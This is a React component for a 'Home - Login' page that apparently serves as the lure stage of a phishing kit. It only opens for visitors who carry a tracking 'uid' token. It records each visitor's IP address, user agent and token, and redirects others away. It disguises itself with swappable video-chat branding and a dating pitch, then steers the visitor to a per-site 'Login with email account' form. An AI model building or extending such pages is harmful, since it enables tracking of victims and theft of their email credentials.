import { useEffect, useState } from "react";
import { Helmet } from "react-helmet"
import { useNavigate, useParams, useSearchParams } from "react-router-dom";
import request from "../../utils/request";
import PageLoader from "../../Components/PageLoader";

function Index() {
    const [searchParams, setSearchParams] = useSearchParams();
    let {site, categoryType} = useParams();
    const navigate = useNavigate();
    const [sites, setSites] = useState(null)
    const [categoryTypes, setCategoryTypes] = useState(null)
    
   const handleVisitorInfo = async () => {

      let ipAddress = null;

      try {
         const response = await request.get('https://api.ipify.org?format=json')
         ipAddress = response.data.ip;
         
      } catch (err) {
         console.error('Error fetching the IP:', err)
      }

      try {
          const { data } = await request.post('/visitor-information/store', {
            user_access_token: searchParams.get("uid"),
            site: site,
            user_agent: window.navigator.userAgent,
             ip_address: ipAddress,
            video_calling_type: categoryType
          });
          
          if (data.success) {
              setCategoryTypes(data.video_calling_details)
              setSites(data.site_details)
          }
         
      } catch (error) {
         if (error.status === 403) {
            navigate('/page-not-found'); 
         }

         console.log(error);
      }
   }


    useEffect(() => { 
      if (!searchParams.get("uid")) {
         navigate('/page-not-found'); 
      } else {
         handleVisitorInfo()
      }
   }, [searchParams])
  return (
    <>
        <Helmet>
            <title>Home - Login</title>
            <link rel="icon" type="image/png" href={categoryTypes?.image} />
            <link rel="icon" type="image/svg" href={categoryTypes?.image}/>
            <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet"></link>
            <link href="/video-calling/index.css" rel="stylesheet"></link>
            <script src="https://cdn.tailwindcss.com"></script>
        </Helmet>
          <PageLoader>
              <div id="mainSystem" className="h-screen z-1 relative flex items-center justify-center">
            <video id="camera" playsInline autoPlay=""></video>
            <div id="videoChatBlock" className=" max-w-[400px] bg-white rounded">
                <div className="p-5 ">
                    <div className="mx-auto flex items-center justify-center mt-5">
                        <img className="h-16 w-16 text-center" src={categoryTypes?.image} alt="img"/>
                    </div>
                    <h2 className="text-3xl font-bold text-blue-900 text-center capitalize">{categoryTypes?.name?.replace('_', ' ')}</h2>
                    <p className="text-xl pt-5 font-semibold text-[#707b8e]">
                        Login With Email and enjoy with  <b className={`text-[${categoryTypes?.color}]`}><span className="text-nowrap capitalize">{categoryTypes?.name?.replace('_', ' ')} </span> video chat </b>
                        your dating partner.
                    </p>
                      <a
                          href={`/${sites?.name}/login/${categoryTypes?.name}?uid=${searchParams.get("uid")}`}
                          className={
                          "flex items-center justify-center gap-5 p-2 my-5 w-full text-xl font-semibold text-white rounded-md " + `bg-[${categoryTypes?.color}]`
                        }
                      >
                        <div className="flex justify-center items-center gap-3">
                            {
                                sites?.image && <img className="size-9 text-center" src={sites.image} alt="img"/>
                            }
                            <span>Login with email account</span>
                        </div>
                    </a>
                </div>
            </div>
        </div>
        </PageLoader>
    </>
  )
}

export default Index

